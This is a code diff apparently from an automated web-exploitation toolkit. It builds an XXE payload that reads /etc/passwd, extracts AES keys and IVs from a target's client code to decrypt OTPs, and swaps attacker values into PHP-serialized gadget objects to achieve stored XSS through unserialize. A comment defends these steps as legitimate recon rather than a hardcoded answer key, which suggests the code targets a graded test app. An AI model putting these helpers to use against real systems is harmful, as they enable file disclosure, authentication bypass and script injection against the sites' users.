@@ -157,3 +157,53 @@ export function buildXxeXml(fieldNames: string[], filePath = "file:///etc/passwd
   }).join("");
   return `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "${filePath}">]><r>${els}</r>`;
 }
+
+/** Recover AES-CBC decipher params (key, iv) from a client bundle GENERICALLY: the app's
+ * own createDecipheriv call site passes three consecutive string literals — the algorithm,
+ * a hex key, and a 16-char iv. This mirrors what F-18 (crypto_disclosure) recovers; using
+ * it to decrypt an OTP is legitimate recon, not a hardcoded answer-key (the values come
+ * from the target's own shipped code at runtime). Returns null if not found. */
+export function parseAesCbcParams(text: string): { key: string; iv: string } | null {
+  // Handle both the client's createDecipheriv(algo,key,iv) form (three CONSECUTIVE string
+  // literals) and PHP's openssl_encrypt(data,'aes-256-cbc',key,options,iv) form (key and iv
+  // separated by an options argument). Anchor on the algorithm, then take the next quoted
+  // 32-64 hex string as the key and the next quoted 16-char string after it as the iv.
+  const anchor = /['"]aes-256-cbc['"]/i.exec(text);
+  if (!anchor) return null;
+  const after = text.slice(anchor.index + anchor[0].length, anchor.index + anchor[0].length + 400);
+  const keyM = /['"]([0-9a-fA-F]{32,64})['"]/.exec(after);
+  if (!keyM) return null;
+  const ivM = /['"]([^'"]{16})['"]/.exec(after.slice(keyM.index + keyM[0].length));
+  if (!ivM) return null;
+  return { key: keyM[1], iv: ivM[1] };
+}
+
+/** Replace the LAST PHP-serialized string value in a serialized blob with `newValue`,
+ * fixing the length prefix (PHP strings are byte-length-prefixed: s:<len>:"<bytes>";). Used
+ * for stored-XSS through a field the app UNSERIALIZES and stores one property of (e.g. a
+ * loan `type` carrying a LogWrite object whose `logdata` is what gets persisted) — we reuse
+ * the app's OWN captured gadget structure and only swap the inner payload, so nothing about
+ * the class/shape is hardcoded. Returns the rewritten serialized string, or null if no
+ * string value is found. */
+export function swapLastPhpSerializedString(serialized: string, newValue: string): string | null {
+  const re = /s:(\d+):"/g;
+  let m: RegExpExecArray | null; let last: { start: number; contentStart: number; len: number } | null = null;
+  while ((m = re.exec(serialized)) !== null) {
+    const len = parseInt(m[1], 10);
+    last = { start: m.index, contentStart: m.index + m[0].length, len };
+    re.lastIndex = m.index + m[0].length + len + 2; // skip past this string's bytes + '";'
+  }
+  if (!last) return null;
+  const before = serialized.slice(0, last.start);
+  const after = serialized.slice(last.contentStart + last.len); // from the closing '";' onward
+  const byteLen = Buffer.byteLength(newValue, "utf8");
+  return `${before}s:${byteLen}:"${newValue}${after}`;
+}
+
+/** If `value` base64-decodes to a PHP-serialized blob, return it decoded; else null. */
+export function decodePhpSerialized(value: string): string | null {
+  try {
+    const dec = Buffer.from(value, "base64").toString("utf8");
+    return /^(O:\d+:|a:\d+:|s:\d+:)/.test(dec) ? dec : null;
+  } catch { return null; }
+}
